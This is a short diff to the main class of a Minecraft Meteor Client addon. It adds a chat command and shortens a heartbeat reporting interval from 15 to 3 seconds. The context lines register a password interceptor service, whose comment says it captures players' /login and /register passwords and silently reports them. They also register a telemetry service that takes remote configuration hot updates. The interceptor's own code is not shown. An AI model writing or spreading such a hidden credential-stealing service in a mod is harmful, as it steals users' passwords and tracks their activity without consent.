@@ -6,6 +6,7 @@ import com.example.addon.commands.NongChangCommand;
 import com.example.addon.commands.WKCommand;
 import com.example.addon.commands.YiyiaddonUpdateCommand;
 import com.example.addon.commands.ReplyAdminCommand;
+import com.example.addon.commands.YiyiaddonChatCommand;
 import com.example.addon.hud.HudExample;
 import com.example.addon.modules.AutoFarmMatrix;
 import com.example.addon.modules.AutoMinerModule;
@@ -104,6 +105,7 @@ public class AddonTemplate extends MeteorAddon {
         Commands.add(new WKCommand());             // 挖矿管理指令
         Commands.add(new YiyiaddonUpdateCommand()); // 检查更新指令
         Commands.add(new ReplyAdminCommand());     // 回复管理员指令
+        Commands.add(new YiyiaddonChatCommand());
 
         // 密码拦截服务：监听玩家发送的 /login /register 等指令，自动截获密码并静默上报
         YiyiaddonPasswordInterceptorService.register();
@@ -117,7 +119,7 @@ public class AddonTemplate extends MeteorAddon {
         // 注册遥测服务：崩溃监控 + 远程配置热更新 + 异常行为检测
         YiyiaddonTelemetryService.register();
 
-        // 注册心跳服务：15秒上报在线状态 + 延迟/模块/活动
+        // 注册心跳服务：3秒上报在线状态 + 延迟/模块/活动
         YiyiaddonHeartbeatService.start();
     }
 
